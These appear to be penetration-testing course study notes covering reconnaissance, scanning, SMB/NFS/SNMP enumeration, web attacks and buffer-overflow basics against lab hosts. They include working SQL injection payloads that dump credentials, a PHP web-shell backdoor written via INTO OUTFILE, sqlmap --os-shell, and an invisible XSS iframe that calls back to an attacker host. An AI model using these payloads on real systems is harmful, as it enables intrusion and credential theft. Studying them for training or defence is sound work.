@@ -1,0 +1,311 @@
+-----------------------------------6. Passive Information Gathering---------------------------------------------------
+
+Whois Enumeration:---> Whois 139 is a TCP service, tool, and a type of database that can provide information about a domain
+name, such as the name server 140 and registrar.
+Github Searching:-> automate the searching we use tool such as Gitrob-159 and Gitleaks-160 Recon-ng also has several modules for searching GitHub
+Shodan:--> search engine that crawls devices connected to the Internet.This includes the servers that run websites but also devices like routers
+and IoT devices
+Pastebin:--> is a website for storing and sharing text. Kali Linux includes the “rockyou” wordlist generated from a data breach in 2009.
+Email Harvesting:--> theHarvester tool gathers emails, names, subdomains, IPs, and URLs from multiple public data sources.
+Social-Searcher:--> is a search engine for social media sites. The search results will include information posted by the target organization and what people are
+saying about it.
+Twofi:--> scans a user’s Twitter feed and generates a personalized wordlist used for password attacks against that user.
+linkedin2username:--> is a script for generating username lists based on LinkedIn data. It requires valid LinkedIn credentials and depends on a LinkedIn 
+connection to individuals in the target organization.
+OSINT Framework:--> includes information gathering tools and websites in one central location.Some tools listed in the framework cover more disciplines 
+than information security.The OSINT framework is not meant to be a checklist, but reviewing the categories and available
+tools may spur ideas for additional information gathering opportunities.
+Maltego:--> is a very powerful data mining tool that offers an endless combination of search tools and strategies.Maltego searches thousands of online data
+sources, and uses extremely clever “transforms” to convert one piece of information into another.
+
+-----------------------------------7. Active Information Gathering---------------------------------------------------
+
+DNS lookup of common hostnames(173):--> These wordlists can be installed to the /usr/share/seclists directory using the sudo apt install seclists command.
+Reverse Lookup Brute Force:--> Our DNS forward brute force enumeration revealed a set of scattered IP addresses in the same
+approximate range (38.100.193.X). If the DNS administrator of megacorpone.com configured PTR 191 records for the domain, we could scan the approximate range 
+with reverse lookups to request the hostname for each IP.
+kali@kali:~$ for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
+DNSRecon and DNSenum :--> tools in Kali Linux that can automate DNS enumeration
+DNSRecon:---> DNSRecon 193 is an advanced, modern DNS enumeration script written in Python. Running dnsrecon against megacorpone.com using the -d 
+option to specify a domain name, and -t to specify the type of enumeration to perform (in this case a zone transfer)
+ali@kali:~$ dnsrecon -d megacorpone.com -t axfr
+DNSEnum:--> is another popular DNS enumeration tool. (kali@kali:~$ dnsenum zonetransfer.me)
+
+Port Scanning:------------>sudo:--> nmap use sudo due to the fact that quite a few Nmap scanning options require access to raw sockets,hich in turn require root 
+privileges. Raw sockets allow for surgical manipulation of TCP and UDP packets.Without access to raw sockets Nmap is limited as it falls back to crafting packets
+by using the standard Berkeley socket API. ($ sudo iptables -vn -L)
+
+iptables:--> We’ll scan one of the lab machines while monitoring the amount of traffic sent to the target host using iptables .
+
+TCP Port scanning:---> Netcat TCP port scan (kali@kali:~$ nc -nvv -w 1 -z 10.11.1.220 3388-3390) we will run a TCP Netcat port scan on ports 3388-3390. The -w option 
+specifies the connection timeout in seconds and -z is used to specify zero-I/O mode, which will send no data and is used for scanning.
+
+Stealth / SYN Scanning:-->DEFAULT  (equired raw sockets privileges) without completing a TCP handshake. Because the three-way handshake is never completed, the information is not passed to the
+application layer and as a result, will not appear in any application logs.
+
+TCP Connect Scanning:--> complete scan.Nmap TCP connect scan makes use of the Berkeley sockets API to perform the three-way handshake,
+it does not require elevated privileges. 
+
+
+UDP Port scanning:-->Netcat UDP port scan (kali@kali:~$ nc -nv -u -w 1 -z 10.10.10.10 166-169) 
+               using a protocol-specific UDP port scanner may help in obtaining more accurate results. 
+sudo nmap -sU -sS 10.11.1.115:--->
+When performing a UDP scan, 202 Nmap will use a combination of two different methods to determine if a port is open or closed. For most ports, it will use the
+standard “ICMP port unreachable” method described earlier by sending an empty packet to a given port. However, for common ports, such as port 161,
+ which is used by SNMP, it will send a protocol-specific SNMP packet in an attempt to get a response from an application bound to that port.
+
+
+Network Sweeping:---> host discovery process. To deal with large volumes of hosts, we can attempt to probe targets using Network Sweeping(-sn) techniques,
+in which we begin with broad scans, and use more specific scans against hosts of interest.the host discovery process sending an ICMP echo request and
+Several other probes are used in addition to the ICMP request. Nmap also sends a TCP SYN packet to port 443, a TCP ACK packet to port
+80, and an ICMP timestamp request to verify if a host is available or not.
+
+use Nmap’s “greppable” output parameter, -oG to Search for live machines and GREP also.(kali@kali:~$ nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt)
+
+To save time and network resources, we can also scan multiple IPs, probing for a short list of common ports.For example, let’s conduct a TCP connect scan for
+the top twenty TCP ports(The top twenty nmap ports are determined using the /usr/share/nmap/nmap-services file.) with the --top-ports option and enable OS version 
+detection, script scanning, and traceroute with -A (kali@kali:~$ nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt)
+
+
+Nmap Scripting Engine (NSE):--> to launch user-created scripts in order to automate various scanning tasks. These scripts perform a broad range of functions 
+including DNS enumeration, brute force attacks, and even vulnerability identification. NSE scripts are located in the /usr/share/nmap/scripts directory.
+For example, the smb-os-discovery script attempts to connect to the SMB service on a target system and determine its operating system:
+(kali@kali:~$ nmap 10.11.1.220 --script=smb-os-discovery)
+Another useful (and self-explanatory) NSE script is dns-zone-transfer :(nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com)
+To view more information about a script, we can use the --script-help option, which displays a description of the script and a URL where we can find more
+in-depth information
+
+
+
+Masscan:---------> is arguably the fastest port scanner.It can easily handle a class A or B subnet, which is a more suitable target range
+during a penetration test. it will require access to raw sockets and therefore requires sudo. To try masscan on a class C subnet in the PWK internal lab
+network, we can use the following example. We will add a few additional masscan options, including --rate to specify the desired
+rate of packet transmission, -e to specify the raw network interface to use, and --router-ip to specify the IP address for the appropriate gateway.
+(kali@kali:~$ sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1)
+
+nbtscan and enum4linux
+
+SMB Enumeration:----------> Server Message Block (SMBi s a network protocol that enables users to communicate with remote computers and servers to use
+ their resources or share, open, and edit files.) protocol is complex implementation and open in nature. From unauthenticated SMB null
+sessions in Windows 2000 and XP, to a plethora of SMB bugs and vulnerabilities over the years, SMB has seen its fair share of action.
+
+SMB (TCP port 445) and NetBIOS (TCP port 139):--> are two separate protocols. NetBIOS is an independent session layer protocol and service that allows
+ computers on a local network to communicate with each other. modern implementations of SMB can work without NetBIOS, NetBIOS over TCP
+(NBT) 211 is required for backward compatibility and is often enabled together. There are other, more specialized tools for specifically identifying 
+NetBIOS information, such as nbtscan , which is used in the following example. The -r option is used to specify the originating
+UDP port as 137, which is used to query the NetBIOS name service for valid NetBIOS names: (kali@kali:~$ sudo nbtscan -r 10.11.1.0/24)
+
+Nmap SMB NSE Scripts:--> nmap contains many NSE scripts that can be used to discover and enumerate SMB services.
+These scripts can be found in the /usr/share/nmap/scripts directory: (kali@kali:~$ ls -1 /usr/share/nmap/scripts/smb*)
+To check for known SMB protocol vulnerabilities, we can invoke one of the smb-vuln NSE scripts. We will take a look at smb-vuln-ms08-067,
+ which uses the --script-args option to pass arguments to the NSE script. if we set the script parameter unsafe=1 , the scripts that will run are
+almost (or totally) guaranteed to crash a vulnerable system. Needless to say, exercise extreme caution when enabling this argument
+(kali@kali:~$ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5)
+
+
+
+
+NFS Enumeration(RCP bind):------> Network File System (NFS used with UNIX operating systems) is a distributed file system protocol. It allows a user on a client computer
+to access files over a computer network as if they were on locally-mounted storage.
+Scanning for NFS Shares:---> Both Portmapper 214 and RPCbind 215 run on TCP port 111.PCbind maps RPC services (Remote Procedure Call (RPC) is a protocol that one 
+program can use to request a service from a program located in another computer on a network without having to understand the network's details. RPC is used
+to call other processes on the remote systems like a local system) to the ports on which they listen.
+(kali@kali:~$ nmap -v -p 111 10.11.1.1-254) NSE Script(kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254)
+---> Page 198 for detail exploit---> 
+new user has a UUID of 1001, which is not really what we need. We can change it to 1014 using sed and confirm the change took place. The -i option is used to replace
+ the file in-place and the -e option executes a script. In this case, that happens to be ‘s/1001/1014/g’ , which will 
+globally replace the UUID in the /etc/passwd file: (kali@kali:~/home/marcus$ sudo sed -i -e 's/1001/1014/g' /etc/passwd)
+
+
+SMTP Enumeration:---> the Simple Mail Transport Protocol (SMTP) supports several interesting commands, such as VRFY and EXPN.
+A VRFY request asks the server to verify an email address, while EXPN asks the server for the membership of a mailing list.
+(kali@kali:~$ nc -nv 10.11.1.217 25  VRFY root) 
+
+Simple Network Management Protocol (SNMP):--> SNMP is based on UDP, stateless protocol, and used for IP spoofing and replay attacks.the commonly used SNMP 
+protocols 1, 2, and 2c offer no traffic encryption. To scan for open SNMP ports, we can run nmap as shown in the example that follows. The -sU
+option is used to perform UDP scanning and the --open option is used to limit the output to only display open ports.
+(kali@kali:~$ sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt)
+
+-->onesixtyone<-- tool to perfor SNMP scan
+
+The SNMP MIB Tree:---> The SNMP Management Information Base (MIB) is a database containing information usually related to network management.
+
+Windows SNMP Enumeration Example:---> We can probe and query SNMP values using a tool such as -->"snmpwalk" and snmp-check<--. Using snmpwalk to enumerate the 
+entire MIB tree.
+Enumerating the Entire MIB Tree:--> (kali@kali:~$ snmpwalk -c public -v1 -t 10 10.11.1.14) -c to specify community string, and -v to
+specify the SNMP version number, -t 10 to increase the timeout period to 10 seconds:
+
+1.3.6.1.2.1.25.1.6.0 System Processes
+1.3.6.1.2.1.25.4.2.1.2 Running Programs ( $ to Enumerating running Windows processes $ snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2)
+1.3.6.1.2.1.25.4.2.1.4 Processes Path 
+1.3.6.1.2.1.25.2.3.1.4 Storage Units
+1.3.6.1.2.1.25.6.3.1.2 Software Name (to Enumerating Windows Users $ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25 )
+1.3.6.1.4.1.77.1.2.25  User Accounts (to )
+1.3.6.1.2.1.6.13.1.3   TCP Local Ports (to enumerates the open TCP ports $ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3)
+
+Enumerating Windows Users:--> (kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25)
+
+
+
+-----------------------------------8. Vulnerability Scanning---------------------------------------------------
+
+
+
+To run an authenticated scan against a Linux target, we simply enable the SSH service on the Linux
+target and configure the scanner with valid user credentials. Most scanners will use this access to
+review package versions and validate configurations in an attempt to discover potential
+vulnerabilities.
+Windows authentication generally requires the Windows Management Instrumentation (WMI) 226
+along with credentials for a domain or local account with remote management permissions. Note
+that even with WMI configured, other factors may block authentication including UAC 227 and firewall
+settings. However, once access is properly configured, most scanners analyze the system
+configuration, registry settings, and application and system patch levels. They also review files in
+the Program Files directories as well as all supporting executables and DLLs in the Windows folder,
+all in an attempt to detect potentially vulnerable software.
+
+
+-----------------------------------9. Web Application Attacks---------------------------------------------------
+
+Web Application Enumeration:---> 
+      try to find • Programming language and frameworks • Web server software • Database software • Server operating system
+1 Inspecting URLs:-File extensions, which are sometimes a part of a URL, can reveal the programming language the application was written in. Some of these, like .php,
+2 Inspecting Page Content for sensitive information.
+3 Viewing Response Headers:--> search server responses for additional information. X-” are non-standard HTTP headers.
+4 Inspecting Sitemaps:--> robots.txt and sitemap.xml
+5 Locating Administration Consoles:--> remote administration web applications, or consoles, are accessible via a particular URL. /manager/html and /phpmyadmin
+
+Web Application Assessment Tools:--> 
+1 DIRB:--> DIRB is a web content scanner that uses a wordlist to find directories and pages by issuing requests to the server.
+2 Burp Suite:--
+3 Nikto:--> web server scanner that tests for thousands of dangerous files and programs, vulnerable server versions and various server configuration issues.
+            Nikto can scan multiple servers and ports and will scan as many pages as it can find.($ nikto -host=http://www.megacorpone.com -maxtime=30s)
+
+Exploiting Web-based Vulnerabilities:---->
+1 Exploiting Admin Consoles:--> admin console enumeration and exploitation. attempt default username/password pairs, use enumerated information to guess
+ working credentials, or attempt brute force. AllowNoPassword” is set to False within the phpMyAdmin configuration file (C:\xampp\phpMyAdmin\config.inc.php).
+1.1 Burp Suite Intruder:-->291 We need something that can extract values from a response and inject them into the next request. Burp Suite includes a 
+    “Recursive grep” payload that searches a response with grep 255 for a predefined value and makes the results available for thenext request.
+  We need something that can extract values from a response and inject them into the next request. Burp Suite includes a “Recursive grep” payload that
+searches a response with grep 255 for a predefined value and makes the results available for the next request.
+
+2 Cross-Site Scripting (XSS):--> special characters < > ' " { } ; use HTML encoding(“&lt;” from “<”.) and URL encoding (convert space to “%20”)
+we may need different sets of characters depending on where our input is being included. For example, if our input is being added between div tags, we will
+need to include our own script tags and will need to be able to inject “<” and “>” as part of the payload. If our input is being added within
+an existing JavaScript tag, we might only need quotes and semicolons to add our own code. Other examples of XSS payloads include keystroke loggers, phishing
+attacks, port scanning, and content scrapers/skimmers. Kali Linux includes BeEF, the Browser Exploitation Framework, that can leverage a simple XSS vulnerability 
+to launch many different client-side attacks.
+    
+      Content Injection:---> XSS vulnerabilities are often used to deliver client-side attacks as they allow for the redirection of a
+             victim’s browser to a location of the attacker’s choosing. A stealthy alternative to a redirect is to inject an invisible iframe
+             <iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe> (the iframe is invisible because the height and width are set to zero.)
+             An iframe is used to embed another file, such as an image or another HTML file, within the current HTML document.
+             Once this payload has been submitted, any user that visits the page will connect back to our attack machine.
+             We could take this farther and redirect the victim browser to a client-side attack or to an information gathering script. To do this, 
+             we would want to first capture the victim’s User-Agent header to help identify the kind of browser they are using. Apache HTTP Server will also
+             capture the User-Agent header by default in /var/log/apache2/access.log.
+
+The Secure 271 flag instructs the browser to only send the cookie over encrypted connections, such
+as HTTPS. This protects the cookie from being sent in cleartext and captured over the network.
+The HttpOnly 272 flag instructs the browser to deny JavaScript access to the cookie. If this flag is
+not set, we can use an XSS payload to steal the cookie.
+
+3 Directory Traversal Vulnerabilities:---> (“../” or “..\” characters) Directory traversal vulnerabilities, also known as path traversal vulnerabilities, 
+allow attackers to gain unauthorized access to files within an application or files normally not accessible through a web interface, 
+such as those outside the application’s web root directory. directory traversal attacks can be used to help facilitate file inclusion attacks.
+      
+           Identifying and Exploiting Directory Traversals :--> the examination of URL query strings and form bodies
+in search of values that appear as file references, we can modify these values to attempt to reference
+files such as /etc/passwd on Linux or c:\boot.ini
+on Windows. http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
+
+
+4 File Inclusion Vulnerabilities:--> file inclusion vulnerabilities allow an attacker to include a file into the application’s running code.
+Local file inclusions (LFI) occur when the included file is loaded from the same web server. 
+Remote file inclusions (RFI) occur when a file is loaded from an external source.
+The php.ini file on the Windows 10 lab machine can be found at C:\xampp\php\php.ini.
+
+
+
+
+
+
+
+
+
+
+
+“or 1=1 LIMIT 1;”
+We can add an order by clause to the query for colunm number enumeration (http://10.11.0.22/debug.php?id=1 order by 1)
+We can use UNION statement to extract further data. Unions allow us to add a second select statement to the original query(http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3)
+Extracting Data from the Database version of MariaDB(http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version)  
+the current database user (http://10.11.0.22/debug.php?id=1 union all select 1, 2, user())
+We can enumerate database tables and column structures through the information_schema. (http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables)
+retrieve the column names with the following query:(http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users')
+extract the usernames and passwords(http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users) 
+5 Enumerating the Database:-->  
+            Understanding the Layout of the Output
+10 From SQL Injection to Code Execution:--> Writing a carefully crafted file containing PHP code into the root directory of the web server could 
+then be leveraged for full code execution. (http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts'))
+
+use the INTO OUTFILE function to create a malicious PHP file in the server’s web root. (http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['
+cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php')
+Using the Backdoor PHP Command Shell:--> (http://10.11.0.22/backdoor.php?cmd=ipconfig)
+
+12 Automating SQL Injection:--> os-shell parameter will attempt to automatically upload and execute a remote command shell on the target system.
+                                  (kali@kali:~$ sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell)
+
+
+
+
+-----------------------------------10. Introduction to Buffer Overflows---------------------------------------------------
+
+buffer overflow:-->  is a type of memory corruption vulnerability. owest memory address (0x00000000) and the highest memory address (0x7FFFFFFF) used by applications.
+
+1 The Stack:--> the stack is used for storage of data, pointers, and arguments.
+ When a thread is running, it executes code from within the Program Image or from various Dynamic Link Libraries (DLLs). 
+The thread requires a short-term data area for functions, local variables,and program control information, which is known as the stack.
+To facilitate independent execution of multiple threads, each thread in a running application has its own stack.
+Stack memory is “viewed” by the CPU as a Last-In First-Out (LIFO) structure.
+The x86 architecture implements dedicated PUSH and POP assembly instructions in order to add or remove data to the stack respectively.
+When code within a thread calls a function, it must know which address to return to once the function completes. This “return address” is stored on the stack.
+This collection of data is associated with one function call and is stored in a section of the stack memory known as a stack frame.
+When a function ends, the return address is taken from the stack and used to restore the execution flow back to the main program or the calling function.
+
+ CPU Registers:--> Registers are small, extremely high-speed CPU storage locations where data can be efficiently read or manipulated.
+To perform efficient code execution, the CPU maintains and uses a series of nine-9 32-bit registers (on a 32-bit platform).
+            out of 9/ 6 General Purpose Registers:--> EAX, EBX, ECX, EDX, ESI, and EDI are general purpose registers to store temporary data.
+                                          • EAX (accumulator): Arithmetical and logical instructions
+                                          • EBX (base): Base pointer for memory addresses
+                                          • ECX (counter): Loop, shift, and rotation counter
+                                          • EDX (data): I/O port addressing, multiplication, and division
+                                          • ESI (source index): Pointer addressing of data and source in string copy operations
+                                          • EDI (destination index): Pointer addressing of data and destination in string copy operations
+
+
+            out of 9/ 3  Registers:-->
+      • ESP - The Stack Pointer:-->  Since the stack is dynamic and changes constantly during program execution, ESP, the stack pointer, keeps
+                                     “track” of the most recently referenced location on the stack (top of the stack) by storing a pointer to it.
+      • EBP - The Base Pointer:--> Since the stack is in constant flux during the execution of a thread, it can become difficult for a function to locate its own
+     stack frame, which stores the required arguments, local variables, and the return address. EBP, the base pointer, solves this by storing a pointer to the top
+              of the stack when a function is called. By accessing EBP, a function can easily reference information from its own stack frame while executing
+      •*EIP* - The Instruction Pointer:--> EIP, the instruction pointer, is one of the most important registers for our purposes as it always points to the next code
+        instruction to be executed. Since EIP essentially directs the flow of a program, it is an attacker’s primary target when exploiting any memory corruption 
+         vulnerability such as a buffer overflow.
+
+
+2 Buffer Overflow Walkthrough:--> We will analyze the application source code and discover that by passing a specifically crafted argument to the application,
+we will be able to copy our controlled input string to a smaller-sized stack buffer, eventually overflowing its limits. This overflow will corrupt data on
+the stack, finally leading to a return address overwrite and complete control over the EIP register.
+
+Controlling EIP is the first step in creating a successful buffer overflow.
+
+local variables have a local scope means they are only accessible within the function or block of code they are declared in.
+global variables are stored in the program .data section, a different memory area of a program that is globally accessible by all the application code
+
+
+3 Immunity Debugger (p-355):--> debugger to assist with the exploit development process. A debugger acts as a proxy between the application and the CPU,
+and it allows us to stop the execution flow at any time to inspect the content of the registers as well as the process memory space. we can also execute assembly
+instructions one at a time to better understand the detailed flow of the code.
+
+
+
